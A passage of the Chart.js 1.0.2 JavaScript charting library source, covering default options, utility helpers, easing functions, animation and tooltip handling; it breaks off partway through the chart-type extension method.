/*!
 * Chart.js
 * http://chartjs.org/
 * Version: 1.0.2
 *
 * Copyright 2015 Nick Downie
 * Released under the MIT license
 * https://github.com/nnnick/Chart.js/blob/master/LICENSE.md
 */


(function(){

	"use strict";

	//Declare root variable - window in the browser, global on the server
	var root = this,
		previous = root.Chart;

	//Occupy the global variable of Chart, and create a simple base class
	var Chart = function(context){
		var chart = this;
		this.canvas = context.canvas;

		this.ctx = context;

		//Variables global to the chart
		var computeDimension = function(element,dimension)
		{
			if (element['offset'+dimension])
			{
				return element['offset'+dimension];
			}
			else
			{
				return document.defaultView.getComputedStyle(element).getPropertyValue(dimension);
			}
		}

		var width = this.width = computeDimension(context.canvas,'Width');
		var height = this.height = computeDimension(context.canvas,'Height');

		// Firefox requires this to work correctly
		context.canvas.width  = width;
		context.canvas.height = height;

		var width = this.width = context.canvas.width;
		var height = this.height = context.canvas.height;
		this.aspectRatio = this.width / this.height;
		//High pixel density displays - multiply the size of the canvas height/width by the device pixel ratio, then scale.
		helpers.retinaScale(this);

		return this;
	};
	//Globally expose the defaults to allow for user updating/changing
	Chart.defaults = {
		global: {
			// Boolean - Whether to animate the chart
			animation: true,

			// Number - Number of animation steps
			animationSteps: 60,

			// String - Animation easing effect
			animationEasing: "easeOutQuart",

			// Boolean - If we should show the scale at all
			showScale: true,

			// Boolean - If we want to override with a hard coded scale
			scaleOverride: false,

			// ** Required if scaleOverride is true **
			// Number - The number of steps in a hard coded scale
			scaleSteps: null,
			// Number - The value jump in the hard coded scale
			scaleStepWidth: null,
			// Number - The scale starting value
			scaleStartValue: null,

			// String - Colour of the scale line
			scaleLineColor: "rgba(0,0,0,.1)",

			// Number - Pixel width of the scale line
			scaleLineWidth: 1,

			// Boolean - Whether to show labels on the scale
			scaleShowLabels: true,

			// Interpolated JS string - can access value
			scaleLabel: "<%=value%>",

			// Boolean - Whether the scale should stick to integers, and not show any floats even if drawing space is there
			scaleIntegersOnly: true,

			// Boolean - Whether the scale should start at zero, or an order of magnitude down from the lowest value
			scaleBeginAtZero: false,

			// String - Scale label font declaration for the scale label
			scaleFontFamily: "'Helvetica Neue', 'Helvetica', 'Arial', sans-serif",

			// Number - Scale label font size in pixels
			scaleFontSize: 12,

			// String - Scale label font weight style
			scaleFontStyle: "normal",

			// String - Scale label font colour
			scaleFontColor: "#666",

			// Boolean - whether or not the chart should be responsive and resize when the browser does.
			responsive: false,

			// Boolean - whether to maintain the starting aspect ratio or not when responsive, if set to false, will take up entire container
			maintainAspectRatio: true,

			// Boolean - Determines whether to draw tooltips on the canvas or not - attaches events to touchmove & mousemove
			showTooltips: true,

			// Boolean - Determines whether to draw built-in tooltip or call custom tooltip function
			customTooltips: false,

			// Array - Array of string names to attach tooltip events
			tooltipEvents: ["mousemove", "touchstart", "touchmove", "mouseout"],

			// String - Tooltip background colour
			tooltipFillColor: "rgba(0,0,0,0.8)",

			// String - Tooltip label font declaration for the scale label
			tooltipFontFamily: "'Helvetica Neue', 'Helvetica', 'Arial', sans-serif",

			// Number - Tooltip label font size in pixels
			tooltipFontSize: 14,

			// String - Tooltip font weight style
			tooltipFontStyle: "normal",

			// String - Tooltip label font colour
			tooltipFontColor: "#fff",

			// String - Tooltip title font declaration for the scale label
			tooltipTitleFontFamily: "'Helvetica Neue', 'Helvetica', 'Arial', sans-serif",

			// Number - Tooltip title font size in pixels
			tooltipTitleFontSize: 14,

			// String - Tooltip title font weight style
			tooltipTitleFontStyle: "bold",

			// String - Tooltip title font colour
			tooltipTitleFontColor: "#fff",

			// Number - pixel width of padding around tooltip text
			tooltipYPadding: 6,

			// Number - pixel width of padding around tooltip text
			tooltipXPadding: 6,

			// Number - Size of the caret on the tooltip
			tooltipCaretSize: 8,

			// Number - Pixel radius of the tooltip border
			tooltipCornerRadius: 6,

			// Number - Pixel offset from point x to tooltip edge
			tooltipXOffset: 10,

			// String - Template string for single tooltips
			tooltipTemplate: "<%if (label){%><%=label%>: <%}%><%= value %>",

			// String - Template string for single tooltips
			multiTooltipTemplate: "<%= value %>",

			// String - Colour behind the legend colour block
			multiTooltipKeyBackground: '#fff',

			// Function - Will fire on animation progression.
			onAnimationProgress: function(){},

			// Function - Will fire on animation completion.
			onAnimationComplete: function(){}

		}
	};

	//Create a dictionary of chart types, to allow for extension of existing types
	Chart.types = {};

	//Global Chart helpers object for utility methods and classes
	var helpers = Chart.helpers = {};

		//-- Basic js utility methods
	var each = helpers.each = function(loopable,callback,self){
			var additionalArgs = Array.prototype.slice.call(arguments, 3);
			// Check to see if null or undefined firstly.
			if (loopable){
				if (loopable.length === +loopable.length){
					var i;
					for (i=0; i<loopable.length; i++){
						callback.apply(self,[loopable[i], i].concat(additionalArgs));
					}
				}
				else{
					for (var item in loopable){
						callback.apply(self,[loopable[item],item].concat(additionalArgs));
					}
				}
			}
		},
		clone = helpers.clone = function(obj){
			var objClone = {};
			each(obj,function(value,key){
				if (obj.hasOwnProperty(key)) objClone[key] = value;
			});
			return objClone;
		},
		extend = helpers.extend = function(base){
			each(Array.prototype.slice.call(arguments,1), function(extensionObject) {
				each(extensionObject,function(value,key){
					if (extensionObject.hasOwnProperty(key)) base[key] = value;
				});
			});
			return base;
		},
		merge = helpers.merge = function(base,master){
			//Merge properties in left object over to a shallow clone of object right.
			var args = Array.prototype.slice.call(arguments,0);
			args.unshift({});
			return extend.apply(null, args);
		},
		indexOf = helpers.indexOf = function(arrayToSearch, item){
			if (Array.prototype.indexOf) {
				return arrayToSearch.indexOf(item);
			}
			else{
				for (var i = 0; i < arrayToSearch.length; i++) {
					if (arrayToSearch[i] === item) return i;
				}
				return -1;
			}
		},
		where = helpers.where = function(collection, filterCallback){
			var filtered = [];

			helpers.each(collection, function(item){
				if (filterCallback(item)){
					filtered.push(item);
				}
			});

			return filtered;
		},
		findNextWhere = helpers.findNextWhere = function(arrayToSearch, filterCallback, startIndex){
			// Default to start of the array
			if (!startIndex){
				startIndex = -1;
			}
			for (var i = startIndex + 1; i < arrayToSearch.length; i++) {
				var currentItem = arrayToSearch[i];
				if (filterCallback(currentItem)){
					return currentItem;
				}
			}
		},
		findPreviousWhere = helpers.findPreviousWhere = function(arrayToSearch, filterCallback, startIndex){
			// Default to end of the array
			if (!startIndex){
				startIndex = arrayToSearch.length;
			}
			for (var i = startIndex - 1; i >= 0; i--) {
				var currentItem = arrayToSearch[i];
				if (filterCallback(currentItem)){
					return currentItem;
				}
			}
		},
		inherits = helpers.inherits = function(extensions){
			//Basic javascript inheritance based on the model created in Backbone.js
			var parent = this;
			var ChartElement = (extensions && extensions.hasOwnProperty("constructor")) ? extensions.constructor : function(){ return parent.apply(this, arguments); };

			var Surrogate = function(){ this.constructor = ChartElement;};
			Surrogate.prototype = parent.prototype;
			ChartElement.prototype = new Surrogate();

			ChartElement.extend = inherits;

			if (extensions) extend(ChartElement.prototype, extensions);

			ChartElement.__super__ = parent.prototype;

			return ChartElement;
		},
		noop = helpers.noop = function(){},
		uid = helpers.uid = (function(){
			var id=0;
			return function(){
				return "chart-" + id++;
			};
		})(),
		warn = helpers.warn = function(str){
			//Method for warning of errors
			if (window.console && typeof window.console.warn == "function") console.warn(str);
		},
		amd = helpers.amd = (typeof define == 'function' && define.amd),
		//-- Math methods
		isNumber = helpers.isNumber = function(n){
			return !isNaN(parseFloat(n)) && isFinite(n);
		},
		max = helpers.max = function(array){
			return Math.max.apply( Math, array );
		},
		min = helpers.min = function(array){
			return Math.min.apply( Math, array );
		},
		cap = helpers.cap = function(valueToCap,maxValue,minValue){
			if(isNumber(maxValue)) {
				if( valueToCap > maxValue ) {
					return maxValue;
				}
			}
			else if(isNumber(minValue)){
				if ( valueToCap < minValue ){
					return minValue;
				}
			}
			return valueToCap;
		},
		getDecimalPlaces = helpers.getDecimalPlaces = function(num){
			if (num%1!==0 && isNumber(num)){
				return num.toString().split(".")[1].length;
			}
			else {
				return 0;
			}
		},
		toRadians = helpers.radians = function(degrees){
			return degrees * (Math.PI/180);
		},
		// Gets the angle from vertical upright to the point about a centre.
		getAngleFromPoint = helpers.getAngleFromPoint = function(centrePoint, anglePoint){
			var distanceFromXCenter = anglePoint.x - centrePoint.x,
				distanceFromYCenter = anglePoint.y - centrePoint.y,
				radialDistanceFromCenter = Math.sqrt( distanceFromXCenter * distanceFromXCenter + distanceFromYCenter * distanceFromYCenter);


			var angle = Math.PI * 2 + Math.atan2(distanceFromYCenter, distanceFromXCenter);

			//If the segment is in the top left quadrant, we need to add another rotation to the angle
			if (distanceFromXCenter < 0 && distanceFromYCenter < 0){
				angle += Math.PI*2;
			}

			return {
				angle: angle,
				distance: radialDistanceFromCenter
			};
		},
		aliasPixel = helpers.aliasPixel = function(pixelWidth){
			return (pixelWidth % 2 === 0) ? 0 : 0.5;
		},
		splineCurve = helpers.splineCurve = function(FirstPoint,MiddlePoint,AfterPoint,t){
			//Props to Rob Spencer at scaled innovation for his post on splining between points
			//http://scaledinnovation.com/analytics/splines/aboutSplines.html
			var d01=Math.sqrt(Math.pow(MiddlePoint.x-FirstPoint.x,2)+Math.pow(MiddlePoint.y-FirstPoint.y,2)),
				d12=Math.sqrt(Math.pow(AfterPoint.x-MiddlePoint.x,2)+Math.pow(AfterPoint.y-MiddlePoint.y,2)),
				fa=t*d01/(d01+d12),// scaling factor for triangle Ta
				fb=t*d12/(d01+d12);
			return {
				inner : {
					x : MiddlePoint.x-fa*(AfterPoint.x-FirstPoint.x),
					y : MiddlePoint.y-fa*(AfterPoint.y-FirstPoint.y)
				},
				outer : {
					x: MiddlePoint.x+fb*(AfterPoint.x-FirstPoint.x),
					y : MiddlePoint.y+fb*(AfterPoint.y-FirstPoint.y)
				}
			};
		},
		calculateOrderOfMagnitude = helpers.calculateOrderOfMagnitude = function(val){
			return Math.floor(Math.log(val) / Math.LN10);
		},
		calculateScaleRange = helpers.calculateScaleRange = function(valuesArray, drawingSize, textSize, startFromZero, integersOnly){

			//Set a minimum step of two - a point at the top of the graph, and a point at the base
			var minSteps = 2,
				maxSteps = Math.floor(drawingSize/(textSize * 1.5)),
				skipFitting = (minSteps >= maxSteps);

			var maxValue = max(valuesArray),
				minValue = min(valuesArray);

			// We need some degree of seperation here to calculate the scales if all the values are the same
			// Adding/minusing 0.5 will give us a range of 1.
			if (maxValue === minValue){
				maxValue += 0.5;
				// So we don't end up with a graph with a negative start value if we've said always start from zero
				if (minValue >= 0.5 && !startFromZero){
					minValue -= 0.5;
				}
				else{
					// Make up a whole number above the values
					maxValue += 0.5;
				}
			}

			var	valueRange = Math.abs(maxValue - minValue),
				rangeOrderOfMagnitude = calculateOrderOfMagnitude(valueRange),
				graphMax = Math.ceil(maxValue / (1 * Math.pow(10, rangeOrderOfMagnitude))) * Math.pow(10, rangeOrderOfMagnitude),
				graphMin = (startFromZero) ? 0 : Math.floor(minValue / (1 * Math.pow(10, rangeOrderOfMagnitude))) * Math.pow(10, rangeOrderOfMagnitude),
				graphRange = graphMax - graphMin,
				stepValue = Math.pow(10, rangeOrderOfMagnitude),
				numberOfSteps = Math.round(graphRange / stepValue);

			//If we have more space on the graph we'll use it to give more definition to the data
			while((numberOfSteps > maxSteps || (numberOfSteps * 2) < maxSteps) && !skipFitting) {
				if(numberOfSteps > maxSteps){
					stepValue *=2;
					numberOfSteps = Math.round(graphRange/stepValue);
					// Don't ever deal with a decimal number of steps - cancel fitting and just use the minimum number of steps.
					if (numberOfSteps % 1 !== 0){
						skipFitting = true;
					}
				}
				//We can fit in double the amount of scale points on the scale
				else{
					//If user has declared ints only, and the step value isn't a decimal
					if (integersOnly && rangeOrderOfMagnitude >= 0){
						//If the user has said integers only, we need to check that making the scale more granular wouldn't make it a float
						if(stepValue/2 % 1 === 0){
							stepValue /=2;
							numberOfSteps = Math.round(graphRange/stepValue);
						}
						//If it would make it a float break out of the loop
						else{
							break;
						}
					}
					//If the scale doesn't have to be an int, make the scale more granular anyway.
					else{
						stepValue /=2;
						numberOfSteps = Math.round(graphRange/stepValue);
					}

				}
			}

			if (skipFitting){
				numberOfSteps = minSteps;
				stepValue = graphRange / numberOfSteps;
			}

			return {
				steps : numberOfSteps,
				stepValue : stepValue,
				min : graphMin,
				max	: graphMin + (numberOfSteps * stepValue)
			};

		},
		/* jshint ignore:start */
		// Blows up jshint errors based on the new Function constructor
		//Templating methods
		//Javascript micro templating by John Resig - source at http://ejohn.org/blog/javascript-micro-templating/
		template = helpers.template = function(templateString, valuesObject){

			// If templateString is function rather than string-template - call the function for valuesObject

			if(templateString instanceof Function){
			 	return templateString(valuesObject);
		 	}

			var cache = {};
			function tmpl(str, data){
				// Figure out if we're getting a template, or if we need to
				// load the template - and be sure to cache the result.
				var fn = !/\W/.test(str) ?
				cache[str] = cache[str] :

				// Generate a reusable function that will serve as a template
				// generator (and which will be cached).
				new Function("obj",
					"var p=[],print=function(){p.push.apply(p,arguments);};" +

					// Introduce the data as local variables using with(){}
					"with(obj){p.push('" +

					// Convert the template into pure JavaScript
					str
						.replace(/[\r\t\n]/g, " ")
						.split("<%").join("\t")
						.replace(/((^|%>)[^\t]*)'/g, "$1\r")
						.replace(/\t=(.*?)%>/g, "',$1,'")
						.split("\t").join("');")
						.split("%>").join("p.push('")
						.split("\r").join("\\'") +
					"');}return p.join('');"
				);

				// Provide some basic currying to the user
				return data ? fn( data ) : fn;
			}
			return tmpl(templateString,valuesObject);
		},
		/* jshint ignore:end */
		generateLabels = helpers.generateLabels = function(templateString,numberOfSteps,graphMin,stepValue){
			var labelsArray = new Array(numberOfSteps);
			if (labelTemplateString){
				each(labelsArray,function(val,index){
					labelsArray[index] = template(templateString,{value: (graphMin + (stepValue*(index+1)))});
				});
			}
			return labelsArray;
		},
		//--Animation methods
		//Easing functions adapted from Robert Penner's easing equations
		//http://www.robertpenner.com/easing/
		easingEffects = helpers.easingEffects = {
			linear: function (t) {
				return t;
			},
			easeInQuad: function (t) {
				return t * t;
			},
			easeOutQuad: function (t) {
				return -1 * t * (t - 2);
			},
			easeInOutQuad: function (t) {
				if ((t /= 1 / 2) < 1) return 1 / 2 * t * t;
				return -1 / 2 * ((--t) * (t - 2) - 1);
			},
			easeInCubic: function (t) {
				return t * t * t;
			},
			easeOutCubic: function (t) {
				return 1 * ((t = t / 1 - 1) * t * t + 1);
			},
			easeInOutCubic: function (t) {
				if ((t /= 1 / 2) < 1) return 1 / 2 * t * t * t;
				return 1 / 2 * ((t -= 2) * t * t + 2);
			},
			easeInQuart: function (t) {
				return t * t * t * t;
			},
			easeOutQuart: function (t) {
				return -1 * ((t = t / 1 - 1) * t * t * t - 1);
			},
			easeInOutQuart: function (t) {
				if ((t /= 1 / 2) < 1) return 1 / 2 * t * t * t * t;
				return -1 / 2 * ((t -= 2) * t * t * t - 2);
			},
			easeInQuint: function (t) {
				return 1 * (t /= 1) * t * t * t * t;
			},
			easeOutQuint: function (t) {
				return 1 * ((t = t / 1 - 1) * t * t * t * t + 1);
			},
			easeInOutQuint: function (t) {
				if ((t /= 1 / 2) < 1) return 1 / 2 * t * t * t * t * t;
				return 1 / 2 * ((t -= 2) * t * t * t * t + 2);
			},
			easeInSine: function (t) {
				return -1 * Math.cos(t / 1 * (Math.PI / 2)) + 1;
			},
			easeOutSine: function (t) {
				return 1 * Math.sin(t / 1 * (Math.PI / 2));
			},
			easeInOutSine: function (t) {
				return -1 / 2 * (Math.cos(Math.PI * t / 1) - 1);
			},
			easeInExpo: function (t) {
				return (t === 0) ? 1 : 1 * Math.pow(2, 10 * (t / 1 - 1));
			},
			easeOutExpo: function (t) {
				return (t === 1) ? 1 : 1 * (-Math.pow(2, -10 * t / 1) + 1);
			},
			easeInOutExpo: function (t) {
				if (t === 0) return 0;
				if (t === 1) return 1;
				if ((t /= 1 / 2) < 1) return 1 / 2 * Math.pow(2, 10 * (t - 1));
				return 1 / 2 * (-Math.pow(2, -10 * --t) + 2);
			},
			easeInCirc: function (t) {
				if (t >= 1) return t;
				return -1 * (Math.sqrt(1 - (t /= 1) * t) - 1);
			},
			easeOutCirc: function (t) {
				return 1 * Math.sqrt(1 - (t = t / 1 - 1) * t);
			},
			easeInOutCirc: function (t) {
				if ((t /= 1 / 2) < 1) return -1 / 2 * (Math.sqrt(1 - t * t) - 1);
				return 1 / 2 * (Math.sqrt(1 - (t -= 2) * t) + 1);
			},
			easeInElastic: function (t) {
				var s = 1.70158;
				var p = 0;
				var a = 1;
				if (t === 0) return 0;
				if ((t /= 1) == 1) return 1;
				if (!p) p = 1 * 0.3;
				if (a < Math.abs(1)) {
					a = 1;
					s = p / 4;
				} else s = p / (2 * Math.PI) * Math.asin(1 / a);
				return -(a * Math.pow(2, 10 * (t -= 1)) * Math.sin((t * 1 - s) * (2 * Math.PI) / p));
			},
			easeOutElastic: function (t) {
				var s = 1.70158;
				var p = 0;
				var a = 1;
				if (t === 0) return 0;
				if ((t /= 1) == 1) return 1;
				if (!p) p = 1 * 0.3;
				if (a < Math.abs(1)) {
					a = 1;
					s = p / 4;
				} else s = p / (2 * Math.PI) * Math.asin(1 / a);
				return a * Math.pow(2, -10 * t) * Math.sin((t * 1 - s) * (2 * Math.PI) / p) + 1;
			},
			easeInOutElastic: function (t) {
				var s = 1.70158;
				var p = 0;
				var a = 1;
				if (t === 0) return 0;
				if ((t /= 1 / 2) == 2) return 1;
				if (!p) p = 1 * (0.3 * 1.5);
				if (a < Math.abs(1)) {
					a = 1;
					s = p / 4;
				} else s = p / (2 * Math.PI) * Math.asin(1 / a);
				if (t < 1) return -0.5 * (a * Math.pow(2, 10 * (t -= 1)) * Math.sin((t * 1 - s) * (2 * Math.PI) / p));
				return a * Math.pow(2, -10 * (t -= 1)) * Math.sin((t * 1 - s) * (2 * Math.PI) / p) * 0.5 + 1;
			},
			easeInBack: function (t) {
				var s = 1.70158;
				return 1 * (t /= 1) * t * ((s + 1) * t - s);
			},
			easeOutBack: function (t) {
				var s = 1.70158;
				return 1 * ((t = t / 1 - 1) * t * ((s + 1) * t + s) + 1);
			},
			easeInOutBack: function (t) {
				var s = 1.70158;
				if ((t /= 1 / 2) < 1) return 1 / 2 * (t * t * (((s *= (1.525)) + 1) * t - s));
				return 1 / 2 * ((t -= 2) * t * (((s *= (1.525)) + 1) * t + s) + 2);
			},
			easeInBounce: function (t) {
				return 1 - easingEffects.easeOutBounce(1 - t);
			},
			easeOutBounce: function (t) {
				if ((t /= 1) < (1 / 2.75)) {
					return 1 * (7.5625 * t * t);
				} else if (t < (2 / 2.75)) {
					return 1 * (7.5625 * (t -= (1.5 / 2.75)) * t + 0.75);
				} else if (t < (2.5 / 2.75)) {
					return 1 * (7.5625 * (t -= (2.25 / 2.75)) * t + 0.9375);
				} else {
					return 1 * (7.5625 * (t -= (2.625 / 2.75)) * t + 0.984375);
				}
			},
			easeInOutBounce: function (t) {
				if (t < 1 / 2) return easingEffects.easeInBounce(t * 2) * 0.5;
				return easingEffects.easeOutBounce(t * 2 - 1) * 0.5 + 1 * 0.5;
			}
		},
		//Request animation polyfill - http://www.paulirish.com/2011/requestanimationframe-for-smart-animating/
		requestAnimFrame = helpers.requestAnimFrame = (function(){
			return window.requestAnimationFrame ||
				window.webkitRequestAnimationFrame ||
				window.mozRequestAnimationFrame ||
				window.oRequestAnimationFrame ||
				window.msRequestAnimationFrame ||
				function(callback) {
					return window.setTimeout(callback, 1000 / 60);
				};
		})(),
		cancelAnimFrame = helpers.cancelAnimFrame = (function(){
			return window.cancelAnimationFrame ||
				window.webkitCancelAnimationFrame ||
				window.mozCancelAnimationFrame ||
				window.oCancelAnimationFrame ||
				window.msCancelAnimationFrame ||
				function(callback) {
					return window.clearTimeout(callback, 1000 / 60);
				};
		})(),
		animationLoop = helpers.animationLoop = function(callback,totalSteps,easingString,onProgress,onComplete,chartInstance){

			var currentStep = 0,
				easingFunction = easingEffects[easingString] || easingEffects.linear;

			var animationFrame = function(){
				currentStep++;
				var stepDecimal = currentStep/totalSteps;
				var easeDecimal = easingFunction(stepDecimal);

				callback.call(chartInstance,easeDecimal,stepDecimal, currentStep);
				onProgress.call(chartInstance,easeDecimal,stepDecimal);
				if (currentStep < totalSteps){
					chartInstance.animationFrame = requestAnimFrame(animationFrame);
				} else{
					onComplete.apply(chartInstance);
				}
			};
			requestAnimFrame(animationFrame);
		},
		//-- DOM methods
		getRelativePosition = helpers.getRelativePosition = function(evt){
			var mouseX, mouseY;
			var e = evt.originalEvent || evt,
				canvas = evt.currentTarget || evt.srcElement,
				boundingRect = canvas.getBoundingClientRect();

			if (e.touches){
				mouseX = e.touches[0].clientX - boundingRect.left;
				mouseY = e.touches[0].clientY - boundingRect.top;

			}
			else{
				mouseX = e.clientX - boundingRect.left;
				mouseY = e.clientY - boundingRect.top;
			}

			return {
				x : mouseX,
				y : mouseY
			};

		},
		addEvent = helpers.addEvent = function(node,eventType,method){
			if (node.addEventListener){
				node.addEventListener(eventType,method);
			} else if (node.attachEvent){
				node.attachEvent("on"+eventType, method);
			} else {
				node["on"+eventType] = method;
			}
		},
		removeEvent = helpers.removeEvent = function(node, eventType, handler){
			if (node.removeEventListener){
				node.removeEventListener(eventType, handler, false);
			} else if (node.detachEvent){
				node.detachEvent("on"+eventType,handler);
			} else{
				node["on" + eventType] = noop;
			}
		},
		bindEvents = helpers.bindEvents = function(chartInstance, arrayOfEvents, handler){
			// Create the events object if it's not already present
			if (!chartInstance.events) chartInstance.events = {};

			each(arrayOfEvents,function(eventName){
				chartInstance.events[eventName] = function(){
					handler.apply(chartInstance, arguments);
				};
				addEvent(chartInstance.chart.canvas,eventName,chartInstance.events[eventName]);
			});
		},
		unbindEvents = helpers.unbindEvents = function (chartInstance, arrayOfEvents) {
			each(arrayOfEvents, function(handler,eventName){
				removeEvent(chartInstance.chart.canvas, eventName, handler);
			});
		},
		getMaximumWidth = helpers.getMaximumWidth = function(domNode){
			var container = domNode.parentNode;
			// TODO = check cross browser stuff with this.
			return container.clientWidth;
		},
		getMaximumHeight = helpers.getMaximumHeight = function(domNode){
			var container = domNode.parentNode;
			// TODO = check cross browser stuff with this.
			return container.clientHeight;
		},
		getMaximumSize = helpers.getMaximumSize = helpers.getMaximumWidth, // legacy support
		retinaScale = helpers.retinaScale = function(chart){
			var ctx = chart.ctx,
				width = chart.canvas.width,
				height = chart.canvas.height;

			if (window.devicePixelRatio) {
				ctx.canvas.style.width = width + "px";
				ctx.canvas.style.height = height + "px";
				ctx.canvas.height = height * window.devicePixelRatio;
				ctx.canvas.width = width * window.devicePixelRatio;
				ctx.scale(window.devicePixelRatio, window.devicePixelRatio);
			}
		},
		//-- Canvas methods
		clear = helpers.clear = function(chart){
			chart.ctx.clearRect(0,0,chart.width,chart.height);
		},
		fontString = helpers.fontString = function(pixelSize,fontStyle,fontFamily){
			return fontStyle + " " + pixelSize+"px " + fontFamily;
		},
		longestText = helpers.longestText = function(ctx,font,arrayOfStrings){
			ctx.font = font;
			var longest = 0;
			each(arrayOfStrings,function(string){
				var textWidth = ctx.measureText(string).width;
				longest = (textWidth > longest) ? textWidth : longest;
			});
			return longest;
		},
		drawRoundedRectangle = helpers.drawRoundedRectangle = function(ctx,x,y,width,height,radius){
			ctx.beginPath();
			ctx.moveTo(x + radius, y);
			ctx.lineTo(x + width - radius, y);
			ctx.quadraticCurveTo(x + width, y, x + width, y + radius);
			ctx.lineTo(x + width, y + height - radius);
			ctx.quadraticCurveTo(x + width, y + height, x + width - radius, y + height);
			ctx.lineTo(x + radius, y + height);
			ctx.quadraticCurveTo(x, y + height, x, y + height - radius);
			ctx.lineTo(x, y + radius);
			ctx.quadraticCurveTo(x, y, x + radius, y);
			ctx.closePath();
		};


	//Store a reference to each instance - allowing us to globally resize chart instances on window resize.
	//Destroy method on the chart will remove the instance of the chart from this reference.
	Chart.instances = {};

	Chart.Type = function(data,options,chart){
		this.options = options;
		this.chart = chart;
		this.id = uid();
		//Add the chart instance to the global namespace
		Chart.instances[this.id] = this;

		// Initialize is always called when a chart type is created
		// By default it is a no op, but it should be extended
		if (options.responsive){
			this.resize();
		}
		this.initialize.call(this,data);
	};

	//Core methods that'll be a part of every chart type
	extend(Chart.Type.prototype,{
		initialize : function(){return this;},
		clear : function(){
			clear(this.chart);
			return this;
		},
		stop : function(){
			// Stops any current animation loop occuring
			cancelAnimFrame(this.animationFrame);
			return this;
		},
		resize : function(callback){
			this.stop();
			var canvas = this.chart.canvas,
				newWidth = getMaximumWidth(this.chart.canvas),
				newHeight = this.options.maintainAspectRatio ? newWidth / this.chart.aspectRatio : getMaximumHeight(this.chart.canvas);

			canvas.width = this.chart.width = newWidth;
			canvas.height = this.chart.height = newHeight;

			retinaScale(this.chart);

			if (typeof callback === "function"){
				callback.apply(this, Array.prototype.slice.call(arguments, 1));
			}
			return this;
		},
		reflow : noop,
		render : function(reflow){
			if (reflow){
				this.reflow();
			}
			if (this.options.animation && !reflow){
				helpers.animationLoop(
					this.draw,
					this.options.animationSteps,
					this.options.animationEasing,
					this.options.onAnimationProgress,
					this.options.onAnimationComplete,
					this
				);
			}
			else{
				this.draw();
				this.options.onAnimationComplete.call(this);
			}
			return this;
		},
		generateLegend : function(){
			return template(this.options.legendTemplate,this);
		},
		destroy : function(){
			this.clear();
			unbindEvents(this, this.events);
			var canvas = this.chart.canvas;

			// Reset canvas height/width attributes starts a fresh with the canvas context
			canvas.width = this.chart.width;
			canvas.height = this.chart.height;

			// < IE9 doesn't support removeProperty
			if (canvas.style.removeProperty) {
				canvas.style.removeProperty('width');
				canvas.style.removeProperty('height');
			} else {
				canvas.style.removeAttribute('width');
				canvas.style.removeAttribute('height');
			}

			delete Chart.instances[this.id];
		},
		showTooltip : function(ChartElements, forceRedraw){
			// Only redraw the chart if we've actually changed what we're hovering on.
			if (typeof this.activeElements === 'undefined') this.activeElements = [];

			var isChanged = (function(Elements){
				var changed = false;

				if (Elements.length !== this.activeElements.length){
					changed = true;
					return changed;
				}

				each(Elements, function(element, index){
					if (element !== this.activeElements[index]){
						changed = true;
					}
				}, this);
				return changed;
			}).call(this, ChartElements);

			if (!isChanged && !forceRedraw){
				return;
			}
			else{
				this.activeElements = ChartElements;
			}
			this.draw();
			if(this.options.customTooltips){
				this.options.customTooltips(false);
			}
			if (ChartElements.length > 0){
				// If we have multiple datasets, show a MultiTooltip for all of the data points at that index
				if (this.datasets && this.datasets.length > 1) {
					var dataArray,
						dataIndex;

					for (var i = this.datasets.length - 1; i >= 0; i--) {
						dataArray = this.datasets[i].points || this.datasets[i].bars || this.datasets[i].segments;
						dataIndex = indexOf(dataArray, ChartElements[0]);
						if (dataIndex !== -1){
							break;
						}
					}
					var tooltipLabels = [],
						tooltipColors = [],
						medianPosition = (function(index) {

							// Get all the points at that particular index
							var Elements = [],
								dataCollection,
								xPositions = [],
								yPositions = [],
								xMax,
								yMax,
								xMin,
								yMin;
							helpers.each(this.datasets, function(dataset){
								dataCollection = dataset.points || dataset.bars || dataset.segments;
								if (dataCollection[dataIndex] && dataCollection[dataIndex].hasValue()){
									Elements.push(dataCollection[dataIndex]);
								}
							});

							helpers.each(Elements, function(element) {
								xPositions.push(element.x);
								yPositions.push(element.y);


								//Include any colour information about the element
								tooltipLabels.push(helpers.template(this.options.multiTooltipTemplate, element));
								tooltipColors.push({
									fill: element._saved.fillColor || element.fillColor,
									stroke: element._saved.strokeColor || element.strokeColor
								});

							}, this);

							yMin = min(yPositions);
							yMax = max(yPositions);

							xMin = min(xPositions);
							xMax = max(xPositions);

							return {
								x: (xMin > this.chart.width/2) ? xMin : xMax,
								y: (yMin + yMax)/2
							};
						}).call(this, dataIndex);

					new Chart.MultiTooltip({
						x: medianPosition.x,
						y: medianPosition.y,
						xPadding: this.options.tooltipXPadding,
						yPadding: this.options.tooltipYPadding,
						xOffset: this.options.tooltipXOffset,
						fillColor: this.options.tooltipFillColor,
						textColor: this.options.tooltipFontColor,
						fontFamily: this.options.tooltipFontFamily,
						fontStyle: this.options.tooltipFontStyle,
						fontSize: this.options.tooltipFontSize,
						titleTextColor: this.options.tooltipTitleFontColor,
						titleFontFamily: this.options.tooltipTitleFontFamily,
						titleFontStyle: this.options.tooltipTitleFontStyle,
						titleFontSize: this.options.tooltipTitleFontSize,
						cornerRadius: this.options.tooltipCornerRadius,
						labels: tooltipLabels,
						legendColors: tooltipColors,
						legendColorBackground : this.options.multiTooltipKeyBackground,
						title: ChartElements[0].label,
						chart: this.chart,
						ctx: this.chart.ctx,
						custom: this.options.customTooltips
					}).draw();

				} else {
					each(ChartElements, function(Element) {
						var tooltipPosition = Element.tooltipPosition();
						new Chart.Tooltip({
							x: Math.round(tooltipPosition.x),
							y: Math.round(tooltipPosition.y),
							xPadding: this.options.tooltipXPadding,
							yPadding: this.options.tooltipYPadding,
							fillColor: this.options.tooltipFillColor,
							textColor: this.options.tooltipFontColor,
							fontFamily: this.options.tooltipFontFamily,
							fontStyle: this.options.tooltipFontStyle,
							fontSize: this.options.tooltipFontSize,
							caretHeight: this.options.tooltipCaretSize,
							cornerRadius: this.options.tooltipCornerRadius,
							text: template(this.options.tooltipTemplate, Element),
							chart: this.chart,
							custom: this.options.customTooltips
						}).draw();
					}, this);
				}
			}
			return this;
		},
		toBase64Image : function(){
			return this.chart.canvas.toDataURL.apply(this.chart.canvas, arguments);
		}
	});

	Chart.Type.extend = function(extensions){

		var parent = this;

		var ChartType = function(){
			return parent.apply(this,arguments);
		};

		//Copy the prototype object of the this class
		ChartType.prototype = clone(parent.prototype);
		//Now overwrite some of the properties in the base class with the new extensions
		extend(ChartType.prototype, extensions);

		ChartType.extend = Chart.Type.extend;

		if (extensions.name || parent.prototype.name){

			var chartName = extensions.name || parent.prototype.name;
			//Assign any potential default values of the new chart type

			//If none are defined, we'll use a clone of the chart type this is being extended from.
